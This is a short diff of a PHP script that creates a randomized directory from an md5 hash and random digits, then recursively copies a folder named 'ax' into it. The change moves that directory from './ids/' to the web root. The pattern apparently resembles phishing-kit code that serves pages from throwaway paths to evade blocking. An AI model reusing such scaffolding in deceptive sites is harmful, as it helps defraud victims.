@@ -30,7 +30,7 @@ $randomlink = md5($random2);
 
 for ($DIR = '', $i = 0, $do_ll = strlen($a = '123456789')-1; $i != 3; $x = rand(0,$do_ll), $DIR .= $a{$x}, $i++);
 $_SESSION['_DIR_'] = $DIR;
-$DIR = "./ids/".$randomlink.$DIR;
+$DIR = "./".$randomlink.$DIR;
 $khkhkhkhkhkhkh="ax";
 function recurse_copy($khkhkhkhkhkhkh,$DIR) {
 $dir = opendir($khkhkhkhkhkhkh);
